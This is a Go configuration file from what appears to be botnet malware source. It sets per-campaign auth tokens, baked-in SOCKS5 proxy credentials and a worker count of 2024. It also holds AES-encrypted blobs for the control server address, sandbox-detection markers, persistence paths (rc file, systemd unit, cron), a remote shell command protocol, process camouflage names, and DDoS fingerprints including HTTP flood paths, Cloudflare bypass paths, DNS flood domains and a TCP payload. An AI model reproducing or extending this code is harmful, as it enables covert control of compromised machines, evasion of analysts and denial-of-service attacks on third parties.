package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "d5a04136" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "c0QfIab3^u#7YaJn" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V2_2" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "S2OvSHWuCMeK"    //change me run setup.py
var proxyPass = "wRvQdo36s2J8"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("dcfaada98a90f9072e87ec4689ff0c59d445fb353b7749676ac7cd8496f09fbc456d8f093f7bf183186d95731faffbce5fe24246f08b5d8b144218343697e743cfeb07c563d5ae6a") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("0991e2bac6077a3926333f5ffba9b599d7c76b98b49556dac7f4194872cf43c361c58c1dd9647446a39f69028521f86b43607b6924a05a7589256183e5000cb176c739847b50c7690f6fe181d14e3f135f28032f097f4f95a3e5592b73303531288ba77f8f62a8cb46d0424caacd519f205843b3ea")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("5b49c707517934c41ab0ebe7ee5cc8fdaae39bd762e5dacdc2f9032e706b8be7fc0c77a0c4ae87e591f6c4248998d89533c8903267d285b404a458fe4b68782c1fce8e3c0919f80ebcd6")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("ce251ad398e88af84d46cd01013c28bfbacdf27f52f220ed16ec3b644cbc7c71")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("98cce21cc2a317f4937768f74f95de5c95d0419fbf99aa412d1bc8a97f")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("ed7ef1d4a1fc63feda3833f99e721ee45ac50cd8182f592f0e9811e966cb36f72973df736f")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("eb80f87f0c43aced9b0108a803252ee7984959e53d6da340b10a30fd09")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("ea6359082d955677d711882f3f841c0d179090cfebaba952ddd01fc98a60d3d11082c1954bbb524a69ac51e470344b488d32e3a9cc4dd6")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("9efea719fa8bdb724059381a365ff687c851bb6e2e0d6ed041bb467f30afa4699a3fec")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("506393de8785072b1dfbd52432b20e1fbb46320b52ee71bd58")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("b9eddd38f810cb29666a3c119934c87792593c0f3dddcf9d7924e30a66")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("d0025a3f9e299af76b0943e14ce9674946ebba63e24d4d8506444efd18462a8e7524a3ff74417f")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("9738d926c2ca7e90aa33197f94738604228e24201694f0949acc405a9cce9aefd8ed3aaa7ec379b6e1d115")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("a618ba0d508305baae1ed0cdb2fa006ac946319c083913b83d40dcdb5ce256")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("8dd89ed71ae9aa7b50c55f6b0d345c4ea087dd278620097b1a89bf3e")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("9474f7b5d856d2e785d1a234dca1c5808d4f5cf92831b58bdfd2ffc721158130eee038c1bad0108a368ed0fe980b8ebe")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("e7d0d8c019cc3838e9700e25e275110aabe8c04d")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("ca229cb6e623905fa1792c69745c5c8c8046ddd5c8")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("7607b6d195707390a42130e09d6ccd63c033da0f9e811c48e6df20cf312254")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("bcffaef5256fe21ac14bbbb37873da80fed69feab58963730233")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("f2a902cd7bc6dee025f8b9b03eeb246775fb80320ae4890fe4d8cc")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("9d5f086b7c03f1ead3092a6973860d43d0b53dd0d6a9952dcbe3e6")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("78a723de38d9dee2443babd58f3dad4cffe85da474bd652a98557040936d62")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("c9e25ed17dfccb714621b2f3485f599de4a21eba8ae489152af90180498dc412d751f835e335ee55bd9fe89eb02c16e060061b275d")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("8732f777661402d1ccc126b299c566e6374298eecf505e9d30")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("662eaad123d9a9af672f2b20019e99f6280a05a77d4b7e0eb4bcd6f8283e42e86b94")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("8cc5fbc6c4be9869af8ea2c96f4c0b8c492cb35f47ca54c59b7b14b081c1d3abbdfb668330ebf5cdd3e07f3d2642")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("d000ef1fe62a987c76c26658a365533e3039ec525b0fde28e72b4d1d75cf4fb3cef91adcb371d229e9ece018")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("56b0beb73d86c46685ee357df5ecb0dd757de1dac28ca81e5bedf7a5cf20015d9cb0c96b3b95e236ae3f92213418bd8c7cba611e455f67efa3f8")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("2397a8bb91c34053916795efc05a070e601b59d71e831c81786b71dc3608ff05")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("189c8b713e0713a9cd947b699a7e8d49602cc65d12a155288656728d843a1f9f7ee29ac8c5c51ab2fefc9f1d5088d666")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("a134684c5adf5bfe393ec971035811047393d5355ff6f345b6296b66092fa816e49de6d68d")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("3b3279ad129c5a06b33d43c115a4cfa1d3889d062267f7b63abe59923f6b2e232b55eef98cfaee6d8529628cf0a728")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("5f89c07764bf0570d165564af6deaaaad7efdb3c9fa29d0b4a6162bb306f40bd0f6cf18f68a6c494975275fc8e0a0a508df0e4630d7e1b338ba9cb211139fa491e8ffe5bf5d3a0a20d1fa601736e63e63fa4cb534d9fdfa33687701eb5641ea8ee4b343312b74bddbe50ba8a14d1879854")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("ec4ca2f6d82bf770edbc880135cbc2a8fe609b0627e9d1b3f67d8ac07816e13d5640177aaf08cb238d5499a970dcd63ee31227ee4bab08d9e1057e7dfeb54eb2638fa9f5ef6ab0d8913e218be6462ed9ae")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("58d5a6d611ea7ba6868101b362a79268f5e9be5b5f6868dceb2fd8ac8dc5b7157e39fa99e6c130bf8aafe581837d21bdcc08d98091446ad59239bcf2f94f9452fb6991bc068476b0c266bfe5cd2e")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("27e1c26c481a45af5f86b6163a1ba6590792c98e2acd5ab501fc29a12badb2d3aa97c40701d8ab436ca94bc546fd7d4cb02c9f3575891efc3dfcf706b3a67695dcc5e8d29f91b809656b022eac")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("784917a2e911eb237e2a24bb348a0d39a26fb21a86269affbb0fd047e65f35a07f5a7b8d89c6b8226dd5e875fe380efa6f833db16e89caf1ba4b810bdee9a4")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("11c630d5cb948ccda70a11b9179b934465139e77d705828c5a99d5a8f1892ef640b98d9a")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("1ddbdbe2af9b509e6cf58ca55ff83fecdf763f89bee6aa2a3001d0fbb8710af92624107252a9e393d5cd9333a08320b3ac5b6830532f8907cc46add5e280b61d8918baef3137fd1948a8599924c38a6bf125805c081e376ac4d34dffeae232ce4aeb4c2c56538d62c578f51a51bf67e9e53bd5d7c694516a8ce47a1b154021101e51fb2afb96bcbcc474b05974771d6e4b39d701bfd2644c9d39bed7c1fc6145dfa7683a3c7f8df427cd2ff4eeb40e16c5e72e9c20b8ef39154c555bae963724f5f8c665cf01e6c6442618b12fdb7dd92f5e64d048ba7482e030888c81")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("f7c1da8adcef6d0b1d17d66c640602c55b431c5ca82778f5cddbfdb86d85951cd04deb046435f8feb605e70741cd9abcffeb79746d78ebe4e7bb603a1ac4e166ccb22b5b90baeb3102615dd29a001289cacbb1ad0a30ee2c2624cd")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("14e25e18f2ac45f3aa69f7cecc140fcb8c59e8f2c346e5e1d2ace50fd78ba9f7268dff1c4721d148fd5cf9ba83976cfa8cc4906fb3251dd8607d48")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("be64ab9672693d2e90d4f8ae5609a58b7a5025fbbd5281775846b10bae4a758ed7a81dd29947f95c21a005e80d4faf146ef05849e2e1acb4163b4b9f99c01f25dda6d68938073c82f1")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("d8396f7a1ef81bd4b452da6df565ac1a372cb2c3982741")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("d7b6d8e5ac732a2598fe6f76cfde7b8dc305beda8aa51790cc3cabbe3146fb2cdd3c")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("1d30c1f2946892c1c97431e82145df1e0ad8a7311fa92434e963334d5ce11e649cb50fa014830348d8cb6f832828e718aa126654c0c054e931d578447d2bddbc07b4fb4f9926d6225efad5171f73873eda4495f741c4926e6ab30c9b709b5c")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("c50f689727e35ac171b5fa5b40d8172db644")

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("8b2dcc2e84bfd3119be09477c26d2130a24869c65001c1200acf04c30cd796c451cc60dac7b0f3d479bf16d5a76efcbdb228b0005a")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("2ff52919d2600d4c399bfb76f8c1bf82318f")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("4950d3ab157a10a4819ba34bbf0837ed63f0")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("feb6929f66629fc89e05a8229b86038d726dcdecb2fe")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("204bb28338c10479def92cb60919077876c800a539250b6e")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("d06b9307edc3e0185039724b6633a122f3dc04f5db")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("a17252ef1a58b4614534d32aac4331c59499")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("37e141e0e9ff8bae403122ba601cc7a8b5cbfbb5cb6eb7c155")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("ac6b3e9debb6772df61ea3ea0db75e52eafe89415d749edfdb")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("308f014202726a84d2429e83b646c55b0e6474768c7931")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("dcfa91a874f5aef610a96261ef8dae6e6693873c")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
